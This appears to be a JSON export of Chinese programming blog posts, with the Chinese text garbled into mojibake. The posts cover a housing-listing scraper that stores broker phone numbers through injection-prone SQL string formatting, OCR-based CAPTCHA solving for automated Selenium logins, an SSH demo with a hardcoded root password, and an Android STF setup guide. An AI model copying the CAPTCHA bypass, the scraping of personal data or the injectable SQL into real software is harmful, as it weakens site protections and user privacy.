broker_phone = soup.select('#houseChatEntry &gt; div &gt; p.phone-num')[0].text.strip() #ç»çºªäººç”µè¯ house_huxing = soup.select('#generalSituation &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(2) &gt; span.c_000')[0].text.strip() #æˆ¿å±‹æˆ·å‹ house_size = soup.select('#generalSituation &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(3) &gt; span.c_000')[0].text.strip() # æˆ¿å±‹é¢ç§¯ house_direction = soup.select('#generalSituation &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(4) &gt; span.c_000')[0].text.strip() #æˆ¿å±‹æœå‘ house_floor = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(1) &gt; span.c_000')[0].text.strip() #æ‰€åœ¨æ¥¼å±‚ house_fitment = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(2) &gt; span.c_000')[0].text.strip() #è£…ä¿®æƒ…å†µ house_age_limit = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(3) &gt; span.c_000')[0].text.strip() #æˆ¿äº§å¹´é™ house_build_year = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(4) &gt; span.c_000')[0].text.strip() #å»ºé€ æ—¶é—´ house_type = soup.select('#generalExpense &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(2) &gt; span.c_000')[0].text #æˆ¿å±‹ç±»å‹ jiaoyiquanshu = soup.select('#generalExpense &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(3) &gt; span.c_000')[0].text #äº¤æ˜“æƒå± hexinmaidian = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(1) &gt; p')[0].text #æ ¸å¿ƒå–ç‚¹ yezhuxintai = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(2) &gt; p')[0].text.strip() #ä¸šä¸»å¿ƒæ€ fuwujieshao = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(3) &gt; p')[0].text.strip() #æœåŠ¡ä»‹ç» try: fangyuanbianhao = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(4) &gt; p')[0].text.strip().split('ï¼š')[1] #æˆ¿æºç¼–å· except: fangyuanbianhao = '' #æˆ¿æºç¼–å·ä¸å­˜åœ¨çš„è¯èµ‹å€¼ä¸ºç©º #æ‰€æœ‰å­—æ®µå­˜æ”¾åœ¨åˆ—è¡¨æ–¹ä¾¿æ‰“å°æŸ¥çœ‹ house_info = [title,price_all,price_per,house_xiaoqu,house_address,broker_name,broker_phone,house_huxing,house_size,house_direction,house_floor,house_fitment,house_age_limit,house_build_year,house_type,jiaoyiquanshu,hexinmaidian,yezhuxintai,fuwujieshao,fangyuanbianhao] #sqlæ’å…¥è¯­å¥ sql = \"\"\"INSERT INTO `58_ershoufang`.`fang` (`title`, \\ `price_all`, `price_per`, `house_xiaoqu`, `house_address`, `broker_name`, `broker_phone`, `house_huxing`, `house_size`, `house_direction`, `house_floor`, `house_fitment`, `house_age_limit`, `house_build_year`, `house_type`, `jiaoyiquanshu`, `hexinmaidian`, `yezhuxintai`, `fuwujieshao`, `fangyuanbianhao`) \\ VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s');\"\"\" % \\ (title,price_all,price_per,house_xiaoqu,house_address,broker_name,broker_phone,house_huxing,house_size,house_direction,house_floor,house_fitment,house_age_limit,house_build_year,house_type,jiaoyiquanshu,hexinmaidian,yezhuxintai,fuwujieshao,fangyuanbianhao) write_sql(sql) #å†™å…¥mysqlçš„å‡½æ•°","categories":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"},{"name":"UIè‡ªåŠ¨åŒ–","slug":"UIè‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"é€šè¿‡ç™¾åº¦äº‘ORCè§£å†³UIè‡ªåŠ¨åŒ–æµ‹è¯•ä¸­çš„ç®€å•éªŒè¯ç é—®é¢˜","slug":"é€šè¿‡ç™¾åº¦äº‘ORCè§£å†³UIè‡ªåŠ¨åŒ–æµ‹è¯•ä¸­çš„ç®€å•éªŒè¯ç é—®é¢˜","date":"2018-12-19T04:00:00.000Z","updated":"2018-12-19T02:46:47.226Z","comments":true,"path":"2018/12/19/é€šè¿‡ç™¾åº¦äº‘ORCè§£å†³UIè‡ªåŠ¨åŒ–æµ‹è¯•ä¸­çš„ç®€å•éªŒè¯ç é—®é¢˜/","link":"","permalink":"http://yoursite.com/2018/12/19/%E9%80%9A%E8%BF%87%E7%99%BE%E5%BA%A6%E4%BA%91ORC%E8%A7%A3%E5%86%B3UI%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E7%AE%80%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"å‰è¨€åœ¨seleniumåšè‡ªåŠ¨åŒ–æµ‹è¯•çš„æ—¶å€™ç»å¸¸ä¼šé‡åˆ°éªŒè¯ç çš„é—®é¢˜ï¼Œä¹‹å‰é€šè¿‡Tesseract-OCRè½¯ä»¶ç»“åˆpythonçš„pytesseractåº“æ¥å¤„ç†ï¼Œç„¶è€Œåœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­è¯†åˆ«æ•ˆæœå¹¶ä¸æ˜¯ç‰¹åˆ«ç†æƒ³ï¼Œéœ€è¦æ‰‹åŠ¨è®­ç»ƒè‡ªå·±çš„éªŒè¯æ¥æé«˜è¯†åˆ«ç‡ï¼Œå´åˆç»å¸¸é‡åˆ°ç¯å¢ƒæ–¹é¢çš„é—®é¢˜å¯¼è‡´éšœç¢é¢‡å¤šï¼Œç›®å‰æ¯”è¾ƒç«çš„æ–¹æ³•æ˜¯é€šè¿‡å¤§æ•°æ®æœºå™¨å­¦ä¹ ã€äººå·¥æ™ºèƒ½æ¥æ›´å¥½çš„è®­ç»ƒï¼Œä¾‹å¦‚tensorflowæ¡†æ¶ç­‰ã€‚å½“ç„¶æ—¶é—´æœ‰é™çš„è¯è¿˜å¯ä»¥ä½¿ç”¨å¸‚åœºä¸Šå·²ç»æˆç†Ÿçš„å›¾ç‰‡/æ–‡å­—è¯†åˆ«æœåŠ¡ç­‰ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»ç™¾åº¦äº‘äººå·¥æ™ºèƒ½çš„æ–‡å­—è¯†åˆ«æœåŠ¡ã€‚ ä¸€ã€ç¯å¢ƒå‡†å¤‡1.åœ¨ç™¾åº¦äº‘æ–°å»ºåº”ç”¨ä½¿ç”¨è‡ªå·±çš„ç™¾åº¦è´¦å·ç™»é™†ç™¾åº¦äº‘ï¼Œè¿›å…¥æ§åˆ¶å°åï¼Œä¾æ¬¡ç‚¹å‡»å·¦ä¾§çš„â€™æ€»è§ˆâ€™ - â€˜äº§å“æœåŠ¡â€™ - â€˜äººå·¥æ™ºèƒ½â€™ - â€˜æ–‡å­—è¯†åˆ«â€™ï¼Œè¿›å…¥å¦‚ä¸‹é¡µé¢ ç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼Œåº”ç”¨åç§°å’Œåº”ç”¨æè¿°ä¸ºå¿…å¡«ï¼Œå…¶ä»–çš„æ ¹æ®è‡ªå·±çš„éœ€è¦é€‰æ‹©å³å¯ï¼Œæˆ‘è¿™é‡Œå…¨éƒ¨æŒ‰ç…§é»˜è®¤é€‰æ‹©ä¸å»ä¿®æ”¹ã€‚ åˆ›å»ºå®Œæˆååœ¨åº”ç”¨ç®¡ç†é‡Œé¢èƒ½çœ‹åˆ°åˆšåˆšæ–°åˆ›å»ºçš„å†…å®¹å¦‚ä¸‹å›¾ï¼ŒAppIDï¼ŒAPI Keyï¼ŒSecret Keyä¸‰ä¸ªå­—æ®µåé¢è¦ç”¨åˆ°ã€‚ 2.å®‰è£… baidu-aip åº“1pip install baidu-aip äºŒã€ç®€å•DEMO1.é¦–å…ˆéœ€è¦å¯¼å…¥aipåº“çš„AipOcræ–¹æ³•ï¼š1from aip import AipOcr 2.ç„¶åéªŒè¯ç™¾åº¦è´¦å·ï¼š1234APP_ID = '1*******9'API_KEY = 'q*****************5'SECRET_KEY = 'q**************g'client = AipOcr(APP_ID, API_KEY, SECRET_KEY) AppIDï¼ŒAPI Keyï¼ŒSecret Keyåˆ†åˆ«æ˜¯ç¬¬ä¸€æ­¥ç¯å¢ƒå‡†å¤‡ä¸­è·å–çš„ä¸‰ä¸ªå­—æ®µã€‚ 3.äººå·¥æ™ºèƒ½è¯†åˆ«éªŒè¯ç  1234567#æ‰“å¼€æœ¬åœ°æœ¬åœ°éªŒè¯ç with open(r'C:\\Users\\Administrator\\Desktop\\éªŒè¯ç .jpg', 'rb') as fp: yanzhengma = fp.read()#ä½¿ç”¨client.basicAccurate()æˆ–è€…client.basicGeneral()æ–¹æ³•è‡ªåŠ¨è¯†åˆ«éªŒè¯ç a = client.basicAccurate(yanzhengma)print(a) client.basicAccurate() â€“&gt; æ–‡å­—è¯†åˆ«é«˜ç²¾åº¦ç‰ˆæœ¬ï¼Œæ¯å¤©å…è´¹500æ¬¡è¯·æ±‚ã€‚client.basicGeneral() â€“&gt; æ–‡å­—è¯†åˆ«æ™®é€šç²¾åº¦ç‰ˆæœ¬ï¼Œæ¯å¤©å…è´¹50000æ¬¡è¯·æ±‚ã€‚ æ­¤æ—¶æ‰“å°å‡ºæ¥çš„aæ˜¯ä¸€ä¸ªå­—å…¸å¦‚ä¸‹ï¼š 1&#123;&#39;log_id&#39;: 204739743393514642, &#39;words_result_num&#39;: 1, &#39;words_result&#39;: [&#123;&#39;words&#39;: &#39; r:e52&#39;&#125;]&#125; æˆ‘ä»¬åªéœ€è¦å­—å…¸ä¸­çš„éªŒè¯ç ï¼š 12yzm_result = a['words_result'][0]['words']print(yzm_result) 1r:e52 ä½¿ç”¨çš„é«˜ç²¾åº¦è¯†åˆ«ç‰ˆæœ¬ï¼Œä»ç„¶å¶å°”ä¼šè¯†åˆ«é”™è¯¯ï¼Œä¾‹å¦‚ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼ŒéªŒè¯ç å‰é¢å¤šäº†ä¸ªç©ºæ ¼ï¼Œç¬¬ä¸€ä¸ªå­—æ¯råé¢å¤šäº†ä¸ªå†’å·ï¼Œæˆ‘ä»¬æ‰‹åŠ¨å°†è¿™äº›ä¸éœ€è¦çš„å­—ç¬¦æ›¿æ¢ä¸ºç©ºå³å¯ã€‚ 12yzm_result = a['words_result'][0]['words'].strip().replace(' ','').replace('.','').replace(':','').replace('\\'','') return yzm_result åœ¨æˆ‘çš„æµ‹è¯•ä½¿ç”¨ä¸­å‘ç°ï¼Œå¯¹äºè¿™ç§çº§åˆ«çš„å›¾ç‰‡éªŒè¯ç é«˜ç²¾åº¦è¯†åˆ«çš„è¯åªæ˜¯å¶å°”ä¼šå‡ºç°é”™è¯¯ï¼Œæ€»ä½“ä¸Šè¿˜æ˜¯å¾ˆå‡†ç¡®çš„ï¼Œä¸ç”¨è¿‡å¤šæ‹…å¿ƒç™¾åº¦äº‘çš„è¯†åˆ«ç²¾åº¦ï¼Œå®é™…åº”ç”¨åˆ°ä¸šåŠ¡ä¸­å¯ä»¥æ”¾åˆ°å¾ªç¯é‡Œé¢ï¼ŒéªŒè¯ç è¯†åˆ«å¤±è´¥é‡æ–°è¯†åˆ«å³å¯ã€‚ 4.å°†ä¸Šé¢æ­¥éª¤å†™å…¥åˆ°ä¸€ä¸ªæ–¹æ³•æ–¹ä¾¿è°ƒç”¨ï¼š1234567891011121314def yzm(yanzhengma_path): ''' è¯†åˆ«ç™»é™†éªŒè¯ç  ''' APP_ID = '1*******9' API_KEY = 'q*****************5' SECRET_KEY = 'q**************g' client = AipOcr(APP_ID, API_KEY, SECRET_KEY) with open(yanzhengma_path, 'rb') as fp: yanzhengma = fp.read() a = client.basicAccurate(yanzhengma) #basicAccurate basicGeneral yzm_result = a['words_result'][0]['words'].strip().replace(' ','').replace('.','').replace(':','').replace('\\'','') print('ç™»é™†éªŒè¯ç ï¼š' + yzm_result) return yzm_result ä¸‰ã€ç™»é™†åœºæ™¯ä¸»è¦å®ç°è¿‡ç¨‹ï¼š å…ˆæŠŠç™»é™†é¡µé¢çš„éªŒè¯ç ä¿å­˜åˆ°æœ¬åœ° ç„¶åé€šè¿‡ç™¾åº¦äº‘è¯†åˆ«å‡ºç»“æœ å°†ç»“æœå¡«å†™åˆ°éªŒè¯ç è¾“å…¥æ¡† ç‚¹å‡»ç™»é™†å¹¶åˆ¤æ–­éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œä¸æ­£ç¡®çš„è¯è¿”å›ç¬¬ä¸€æ­¥é‡æ–°è·å–å¹¶è¯†åˆ« ç›´æ¥é€šè¿‡ä»£ç çš„æ³¨é‡Šæ¥è§£é‡Šæ¯ä¸€æ­¥ï¼š 12345678910111213141516171819202122232425262728293031from selenium import webdriverfrom aip import AipOcrimport timeyanzhengma_path = 'C:/Users/Administrator/Desktop/' #éªŒè¯ç å­˜æ”¾çš„æœ¬åœ°è·¯å¾„def login(): driver = webdriver.Chrome() #å¯åŠ¨æµè§ˆå™¨ driver.get('https://www.****.com/login.html') #è¿›å…¥ç™»é™†é¡µé¢ driver.maximize_window() #çª—å£æœ€å¤§åŒ– driver.find_element_by_css_selector('#loginName').send_keys('username') #è¾“å…¥ç™»é™†ç”¨æˆ·å time.sleep(0.5) driver.find_element_by_css_selector('#passWord').send_keys('password') #è¾“å…¥ç™»é™†å¯†ç  time.sleep(0.5) n = 1 while True: driver.find_element_by_id('randompicture').screenshot(yanzhengma_path + 'éªŒè¯ç .jpg') #å°†ç™»é™†éªŒè¯ç æˆªå›¾ä¿å­˜åœ¨æœ¬åœ° yzm_result = yzm(yanzhengma_path + 'éªŒè¯ç .jpg') # è‡ªåŠ¨è¯†åˆ«éªŒè¯ç ï¼Œè°ƒç”¨ä¸Šä¸€æ­¥å†™å¥½çš„éªŒè¯ç è¯†åˆ«å‡½æ•°yzm() driver.find_element_by_id('radompicture').send_keys(yzm_result) #å¡«å†™è¯†åˆ«åçš„éªŒè¯ç  time.sleep(0.5) driver.find_element_by_css_selector(\"#loginForm &gt; div &gt; div.login_btn &gt; a\").click() # ç‚¹å‡»\"ç™»é™†\"æŒ‰é’® time.sleep(1) try: #è¿™é‡Œåˆ¤æ–­ç™»é™†å¤±è´¥çš„æç¤ºä¿¡æ¯æ˜¯å¦å­˜åœ¨,æ ¹æ®è‡ªå·±çš„å®é™…ä¸šåŠ¡æ¥åˆ¤æ–­å³å¯ is_element_exist = driver.find_element_by_id('selectShopName') if is_element_exist.text == 'éªŒè¯ç ä¸æ­£ç¡®ï¼': #åˆ¤æ–­ç™»é™†å¤±è´¥æç¤ºä¿¡æ¯æ˜¯å¦æ˜¯\"éªŒè¯ç ä¸æ­£ç¡®ï¼\"ï¼Œæ˜¯åˆ™è¯´æ˜éªŒè¯ç è¯†åˆ«é”™è¯¯ï¼Œé‡æ–°è·å–éªŒè¯ç å¹¶è¯†åˆ« print('éªŒè¯ç ä¸æ­£ç¡®ï¼Œæ­£åœ¨ç¬¬%dæ¬¡é‡æ–°ç™»é™†' % n) n += 1 else: break except: #ç™»é™†å¤±è´¥çš„æç¤ºä¿¡æ¯å…ƒç´ ä¸å­˜åœ¨åˆ™è¯´æ˜ç™»é™†æˆåŠŸï¼Œè·³å‡ºå¾ªç¯ print('ç™»é™†æˆåŠŸ') break ç™¾åº¦äº‘æ–‡å­—è¯†åˆ«è¿˜æœ‰æ›´å¤šå¼ºå¤§çš„åŠŸèƒ½ï¼Œä¾‹å¦‚èº«ä»½è¯ã€è½¦ç‰Œã€è¥ä¸šæ‰§ç…§è¯†åˆ«ç­‰ï¼Œè¯¦ç»†ä»‹ç»å’Œæ”¶è´¹æ ‡å‡†å‚è€ƒã€å®˜æ–¹æ–‡æ¡£ã€‘ã€‚","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"},{"name":"UIè‡ªåŠ¨åŒ–","slug":"UIè‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"éªŒè¯ç ","slug":"éªŒè¯ç ","permalink":"http://yoursite.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"}]},{"title":"Windowsä¸‹python3ç™»é™†å’Œæ“ä½œlinuxæœåŠ¡å™¨","slug":"Windowsä¸‹python3ç™»é™†å’Œæ“ä½œlinuxæœåŠ¡å™¨","date":"2018-10-16T04:00:00.000Z","updated":"2019-03-20T11:02:52.866Z","comments":true,"path":"2018/10/16/Windowsä¸‹python3ç™»é™†å’Œæ“ä½œlinuxæœåŠ¡å™¨/","link":"","permalink":"http://yoursite.com/2018/10/16/Windows%E4%B8%8Bpython3%E7%99%BB%E9%99%86%E5%92%8C%E6%93%8D%E4%BD%9Clinux%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"ä¸€ã€ç¯å¢ƒå‡†å¤‡python3è¿œç¨‹è¿æ¥éœ€è¦ç”¨åˆ°pycrytodomeå’Œparamikoåº“ï¼Œå…¶ä¸­åè€…ä¾èµ–å‰è€…ï¼Œæ‰€ä»¥æŒ‰ç…§é¡ºåºæ¥å®‰è£… 1. å®‰è£…pycrytodome1pip install pycrytodome 2. å®‰è£…paramikoä¸Šä¸€æ­¥å®‰è£…å®Œæ¯•åç›´æ¥pipå®‰è£…paramikoå³å¯ 1pip install paramiko 8777777-================= äºŒã€ç®€å•DEMO1234567891011import paramikodef py_ssh(): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(\"192.168.1.1\",22,\"root\",\"123456\") #å››ä¸ªå‚æ•°åˆ†åˆ«æ˜¯è¿œç¨‹è¿æ¥çš„IPï¼Œç«¯å£ï¼Œç™»å½•åï¼Œå¯†ç  cmd = \"cat /opt/tomcats/tomcat-8082/logs/catalina.out | grep 17600000000 | grep éªŒè¯ç \" stdin,stdout,stderr = ssh.exec_command(cmd) a = stdout.readlines() #æŸ¥è¯¢ç»“æœæ˜¯ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…ƒç´ ä»£è¡¨æŸ¥è¯¢ç»“æœçš„ä¸€è¡Œ print(a) ssh.close() ä¸Šé¢ä¾‹å­å°±æ˜¯è¿æ¥è¿™å°Linuxæœºå™¨åæŸ¥è¯¢catalina.outæ–‡ä»¶ä¸­åŒ…å«æ‰‹æœºå·å’ŒéªŒè¯ç çš„è¡Œã€‚ ä¸‰ã€å¯èƒ½é‡åˆ°çš„é—®é¢˜å¦‚æœå‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼šModuleNotFoundError: No module named &#39;_cffi_backend&#39; ç¡®è®¤cryptographyå’Œcffiåº“å·²ç»å®‰è£…ï¼Œå¦‚æœè¿™ä¸¤ä¸ªå·²ç»è£…äº†è¿˜æ˜¯æŠ¥è¿™ä¸ªé”™æŠŠè¿™ä¸¤ä¸ªåº“å¸è½½äº†é‡æ–°å®‰è£…","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"requestsç®€å•è·å–cookie","slug":"requestsè·å–è¯·æ±‚å’Œè¿”å›çš„cookie","date":"2018-10-16T04:00:00.000Z","updated":"2018-12-17T02:30:56.811Z","comments":true,"path":"2018/10/16/requestsè·å–è¯·æ±‚å’Œè¿”å›çš„cookie/","link":"","permalink":"http://yoursite.com/2018/10/16/requests%E8%8E%B7%E5%8F%96%E8%AF%B7%E6%B1%82%E5%92%8C%E8%BF%94%E5%9B%9E%E7%9A%84cookie/","excerpt":"","text":"ä¸€èˆ¬åœ¨å•ä¸ªè„šæœ¬æ–‡ä»¶ä¸­ç”¨requests.session()å°±å¯ä»¥è‡ªåŠ¨å¤„ç†å¤šä¸ªè¯·æ±‚ä¹‹é—´çš„cookieï¼Œä½†æ˜¯æœ‰æ—¶å€™éœ€è¦å°†ç¬¬ä¸€æ¬¡è¯·æ±‚åçš„cookieè·å–åˆ°å•ç‹¬ä¿å­˜å‡ºæ¥è·¨æ–‡ä»¶è·¨è„šæœ¬ä½¿ç”¨ï¼Œæ­¤æ—¶ç›´æ¥ç”¨.cookiesæ–¹æ³•åªèƒ½è·å–åˆ°response headersä¸­çš„cookieï¼Œè€Œè¯·æ±‚ä¹‹årequest headersä¸­çš„cookieåˆ™éœ€è¦ç”¨ä»¥ä¸‹æ–¹æ³•ã€‚ DEMO12345import requestsr = requests.post(url,data=data)print(r.cookies) #è·å–response headersä¸­çš„cookieprint(r.request._cookies._cookies) #è·å–request headersä¸­çš„cookie ä»¥ä¸Šæ—¶æœ€ç®€å•çš„æ–¹æ³•ï¼Œæ›´è¯¦ç»†çš„æ“ä½œå¯ä»¥ä½¿ç”¨pythonçš„cookielibåº“ã€‚","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"requests","slug":"requests","permalink":"http://yoursite.com/tags/requests/"}]},{"title":"centos 7 å®‰è£…STFç¯å¢ƒ","slug":"centos 7å®‰è£…STFç¯å¢ƒ","date":"2018-10-11T04:00:00.000Z","updated":"2018-12-17T02:30:56.869Z","comments":true,"path":"2018/10/11/centos 7å®‰è£…STFç¯å¢ƒ/","link":"","permalink":"http://yoursite.com/2018/10/11/centos%207%E5%AE%89%E8%A3%85STF%E7%8E%AF%E5%A2%83/","excerpt":"","text":"å‰è¨€å› ä¸ºè‡ªå·±çš„åŠå…¬ç”µè„‘æ˜¯Windowsï¼Œä¹‹å‰ä¸€ç›´å°è¯•åœ¨Windowså®‰è£…STFç¯å¢ƒï¼Œä½†æ˜¯å‘æ¯”è¾ƒå¤šï¼Œå°è¯•å¤šæ¬¡æ— æ³•è§£å†³ï¼Œæœ€ç»ˆåœ¨è™šæ‹Ÿæœºä¸­çš„centosç³»ç»ŸæˆåŠŸå®‰è£…STFï¼Œè™½ç„¶æ˜¯è™šæ‹Ÿæœºä½†å®é™…ä½¿ç”¨ä¸­æ•ˆç‡å¹¶æ²¡æœ‰å¾ˆå¤§å½±å“ï¼Œæœ¬æ–‡ä»‹ç»ä¸€ä¸‹åœ¨centos7å®‰è£…STFçš„è¿‡ç¨‹ï¼Œå‚è€ƒäº†ä¸€äº›æ•™ç¨‹ï¼Œå°†å®‰è£…è¿‡ç¨‹ä¸­é‡åˆ°çš„å„ç§é—®é¢˜åšæ€»ç»“ã€‚ ä¸€ã€åŸºç¡€å‡†å¤‡1. VMware Workstation 14 ï¼ˆå¦‚æœæ˜¯LinuxçœŸæœºï¼Œå¿½ç•¥è¿™ä¸€æ­¥ï¼‰å»ºè®®ä½¿ç”¨VMware Workstation 14åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œæˆ‘åˆšå¼€å§‹ä½¿ç”¨çš„æ˜¯12ç‰ˆæœ¬ï¼Œä½†æ˜¯ç³»ç»Ÿå®‰è£…å®Œæˆåä¸€ç›´æ— æ³•è¯†åˆ«ç§»åŠ¨USBè®¾å¤‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘çš„æ‰‹æœºï¼Œæ¢æˆ14ç‰ˆæœ¬åˆ™æ²¡æœ‰è¿™ä¸ªé—®é¢˜ã€‚å…·ä½“è¡¨ç°å¦‚ä¸‹ï¼Œæ‰‹æœºå·²ç»è¿æ¥ä¸Šäº†è™šæ‹Ÿæœºï¼Œä½†æ˜¯centosä¸­ä½¿ç”¨lsusb å’Œ adb deviceså‘½ä»¤éƒ½æ— æ³•æ£€æµ‹åˆ°è¿™å°æ‰‹æœºï¼š è™šæ‹Ÿæœºå®‰è£…centosæ—¶ï¼ŒUSBå…¼å®¹æ€§é€‰æ‹©USB 3.0ï¼Œç½‘ç»œè¿æ¥é€‰æ‹©æ¡¥æ¥æ¨¡å¼ 2. centos 7centos6.xå®‰è£…æ—¶å€™ä¾èµ–å…³ç³»ä¸å¥½æ•´ç†ï¼Œå»ºè®®ç›´æ¥ä¸‹è½½æ ‡å‡†ç‰ˆcentos7ï¼Œå®‰è£…æ—¶ä¸è¦é€‰æ‹©æœ€å°å®‰è£…æ¨¡å¼ï¼ŒæœåŠ¡å™¨æ¨¡å¼æˆ–è€…æ¡Œé¢æ¨¡å¼å³å¯ï¼Œè¿™æ ·javaç¯å¢ƒç­‰éƒ½ä¼šè‡ªåŠ¨é›†æˆè¿›å»ä¸ç”¨å†æ‰‹åŠ¨é…ç½®ã€‚ 3. å®‰å“æ‰‹æœº å¼€å¯å¼€å‘è€…é€‰é¡¹ å¼€å¯USBè°ƒè¯• å¼€å¯USBå®‰è£…ï¼ˆSTFè¦åœ¨æ‰‹æœºä¸Šå®‰è£…ä¸€ä¸ªSTFæœåŠ¡ï¼Œä¸å¼€å¯æ­¤é€‰é¡¹ä¼šå¯¼è‡´å®‰è£…å¤±è´¥ï¼Œä¹Ÿå°±æ— æ³•é€šè¿‡STFæ“ä½œæ‰‹æœºï¼‰ 4. åŠŸèƒ½æ­£å¸¸çš„USBçº¿5. è¿æ¥æ‰‹æœºï¼ˆå¦‚æœæ˜¯LinuxçœŸæœºï¼Œå¿½ç•¥è¿™ä¸€æ­¥ï¼‰å°†æ‰‹æœºé€šè¿‡USBè¿æ¥ç”µè„‘ï¼ŒåŒæ—¶åœ¨è™šæ‹Ÿå¯ç§»åŠ¨è®¾å¤‡ä¸­è¿æ¥æ­¤æ‰‹æœº è‹¥æœä¸Šå›¾ä¸­æ²¡æœ‰â€å¯ç§»åŠ¨è®¾å¤‡â€çš„é€‰é¡¹ï¼Œæ˜¯å› ä¸ºè™šæ‹Ÿæœºçš„USBæœåŠ¡æ²¡æœ‰å¼€å¯ï¼Œå¼€å¯æ–¹æ³•å¦‚ä¸‹ï¼šwin + Ré”®æ‰“å¼€è¾“å…¥çª—å£ï¼Œè¾“å…¥services.mscæŒ‰å›è½¦ï¼Œæ‰“å¼€æœåŠ¡åˆ—è¡¨ï¼Œæ‰¾åˆ°VMware USB Arbitration Serviceï¼ŒåŒå‡»è¿›å…¥ç¼–è¾‘é¡µé¢ï¼Œç‚¹å‡»å¯åŠ¨ã€‚ äºŒã€ç¯å¢ƒå®‰è£…1.åŸºæœ¬å‘½ä»¤å®‰è£…å®‰è£…wgetã€zipã€unzipç­‰å‘½ä»¤ 12yum install wgetyum install -y unzip zip 2.javaç¯å¢ƒé…ç½®(å®‰è£…çš„æ ‡å‡†ç‰ˆcentos7å¯å¿½ç•¥è¿™ä¸€æ­¥ï¼Œç³»ç»Ÿå·²è‡ªå¸¦java1.8)é¦–å…ˆä¸‹è½½jdk 12345cd /usr/localmkdir javacd javawget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.rpm\"rpm -ivh jdk-8u151-linux-x64.rpm é…ç½®ç¯å¢ƒå˜é‡ 1vi /etc/profile åœ¨æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹å†…å®¹ï¼š 123export JAVA_HOME=/usr/java/jdk1.8.0_151export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar éªŒè¯ç¯å¢ƒæ˜¯å¦okï¼š 1java -version 3.android SDKç¯å¢ƒé…ç½®é¦–å…ˆä¸‹è½½SDK 12345cd /usr/localmkdir androidcd androidwget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zipunzip sdk-tools-linux-3859397.zip é…ç½®ç¯å¢ƒå˜é‡ 1vi /etc/profile åœ¨æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹å†…å®¹ï¼š 1export PATH=$PATH:/usr/local/android/tools/bin ç„¶åæ‰§è¡Œ 1source profile å®‰è£…platform-tools 1sdkmanager \"platform-tools\" é…ç½®ç¯å¢ƒå˜é‡ 1vi /etc/profile åœ¨æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹å†…å®¹ï¼š 1export PATH=$PATH:/usr/local/android/platform-tools æ‰§è¡Œ 1source profile æŸ¥çœ‹å·²å®‰è£…ä¿¡æ¯ 1sdkmanager --list éªŒè¯ç¯å¢ƒæ˜¯å¦okï¼š 1adb --version æ£€æŸ¥æ‰‹æœºæ˜¯å¦è¿æ¥æˆåŠŸï¼š 1adb devices 